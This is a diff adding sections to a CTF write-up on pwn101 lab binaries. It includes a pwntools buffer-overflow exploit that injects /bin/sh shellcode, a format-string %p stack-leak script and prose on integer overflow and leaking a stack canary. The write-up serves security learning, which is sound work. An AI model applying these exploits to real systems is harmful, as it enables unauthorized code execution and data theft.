@@ -108,13 +108,96 @@ Let's find the offset. I use the following code to do that:
     info("rip offset is %d", rip_offset)
 ![image](https://github.com/user-attachments/assets/50af6090-9313-455e-a70e-43e7a234caac)<br />
 So the offset is `88`. The problem is that the address of the buffer changes at every execution. I don't really now why. Checksec says that the binary is not PIE, so it shouldn't be like that. Maybe I'm missing something. <br />
-But it's not important. Since the program leaks the address of the buffer, I can use that as a reference.
+But it's not important. Since the program leaks the address of the buffer, I can use that as a reference. The code to exploit the binary is the following:<
+
+    from pwn import *
+    
+    context.arch = 'amd64'  # Ensure architecture matches the binary
+    
+    # Start the process
+    #p = process("./pwn104-1644300377109.pwn104")  # Change with actual binary name
+    ip = "10.10.135.169"
+    port = 9004
+    
+    p = remote(ip,port)
+    
+    # Receive the leaked buffer address
+    p.recvuntil(b"I'm waiting for you at ")
+    leaked_addr = int(p.recvline().strip(), 16)  # Convert leaked address to integer
+    log.info(f"Leaked buffer address: {hex(leaked_addr)}")
+    
+    # Offset between buffer and RIP overwrite (88 bytes)
+    padding = b"A" * 88  
+
+    
+    # Shellcode (executes /bin/sh)
+    shellcode = asm(shellcraft.sh())
+    print(f"[+] Shellcode size: {len(shellcode)} bytes")
+    
+    # NOP sled
+    nop_sled = b"\x90" * 20  # Adjust size as needed
+    payload = padding
+    payload += p64(leaked_addr+100)  # Overwrite RIP with shellcode address
+    payload += nop_sled + shellcode
+    
+    # Send the payload
+    p.sendline(payload)
+    
+    # Interact with shell
+    p.interactive()
+Here I'm abusing the fact that even if the offset is at 88, the `read` function reads 200 bytes, so I can actually use that extra space to put my shellcode. So I add 88 bytes of "A"s, and then put some NOPs and then the shellcode, and then I jump to the NOP sled, which is the address of the buffer + something, I opted for 20.<br />
+![image](https://github.com/user-attachments/assets/2fc2725f-5407-4e6a-b20a-07cc17a8b5bf)<br />
 
 ### Challenge 5 - pwn101
+The first part of the binary takes two user inputs and sums them:<br />
+![Screenshot 2025-03-21 093933](https://github.com/user-attachments/assets/21c3081b-28ca-472f-96a1-e5634bb517f3)<br />
+Then:<br />
+![Screenshot 2025-03-21 094039](https://github.com/user-attachments/assets/aeadb525-55c1-400c-8077-2c3527dda29e)<br />
+The "test" instruction in this case checks if the numbers provided are negative, for example:<br />
+![Screenshot 2025-03-21 094320](https://github.com/user-attachments/assets/d0327a3e-6fa1-4880-85de-64f97a42871b)<br />
+In that case it exits. But if the sign of the sum is positive, then it just prints the sum. What we want is to send two positive numbers that cam be rapresented by the system as positive numbers, but such that their sum cannot, meaning their sum will result in an integer overflow, therefore represented as a negative number. After some trial and error, I found a number that works, which is `555555555555555`:<br />
+![image](https://github.com/user-attachments/assets/bd238868-7ec6-4671-8f88-7000ab84955e)<br />
+So now I just need to do the same thing on the remote host:<br />
+![Screenshot 2025-03-21 095221](https://github.com/user-attachments/assets/f2c98059-fe0c-417b-903f-f0d9f328752f)<br />
 
 ### Challenge 6 - pwn101
+Here's what the binary does:<br />
+![image](https://github.com/user-attachments/assets/e8c747cd-9a24-4e6f-9704-34263d9e23ea)<br />
+It takes user input and then calles `printf`, but without specifying any format. This allows user to send a payload of `%p`, which can be used to print values from the stack. That is because `%p` takes a value and prints it in hex, this means that my payload is going to take values from the stack itself and print them in hex.<br />
+So the code I used is pretty straightforward:
+
+    from pwn import *
+    #p = process("./pwn106-user-1644300441063.pwn106-user")  # Cambia con il nome reale del binario
+    
+    ip = "10.10.135.169"
+    port = 9006
+    
+    p = remote(ip,port)
+    
+    payload = b"%p" * 40
+
+    p.sendline(payload)
+    
+    p.interactive()
+![image](https://github.com/user-attachments/assets/61adea96-dae1-45d3-b0fc-e86d5d67ca96)<br />
+So now I take this bytes and try to hex-decode them on cyberchef:<br />
+![image](https://github.com/user-attachments/assets/7792c2bf-0841-48fb-9833-58204c125e95)<br />
+As you can see the flag is in there, it's a bit drunk but it's there lol, probably because I need to convert it in little endian.<br />
+I simply asked chatGPT to do that for me, and that's how I got the flag.
 
 ### Challenge 7 - pwn101
+This is how the program behaves:<br />
+![Screenshot 2025-03-21 114528](https://github.com/user-attachments/assets/93232cd5-bf4b-48e3-aaf8-3d903b04c958)<br />
+It takes two inputs from the user.<br />
+And this is how IDA disassembles it:<br />
+![image](https://github.com/user-attachments/assets/f1d397f6-9c85-4e8f-8212-fcc1f27b2b6a)<br />
+There's also a hidden function that is not called by the main, which spawns a shell:<br />
+![Screenshot 2025-03-21 114711](https://github.com/user-attachments/assets/0e672e3f-0b7b-4117-9c69-70720ea73476)<br />
+The bad new is that it has all the defenses enabled D:<br />
+![Screenshot 2025-03-21 114605](https://github.com/user-attachments/assets/7cd49870-45ba-4c3e-b6bb-a9e10a0968fe)<br />
+This challenge is about bypassing those mitigations. The very first thing that I can do is use the first interaction with the binary to leak the value of the canary. That is thanks to a format string vulnerability, the binary is printing my input with `printf(buf)`. <br />
+![Screenshot 2025-03-21 115203](https://github.com/user-attachments/assets/c84bf550-a09c-4e81-91e2-a0ec39126b07)<br />
+The buffer is stored at -40h, which is 64 bits. So in order to leak the canary, I need to provide at least 8 times `%p`. That's because each `%p` leaks 8 bits from the stack. So in theory, right after leaking the 64 bits from the stack, the next 8 bits should be the value of the canary. 
 
 ### Challenge 8 - pwn101
 
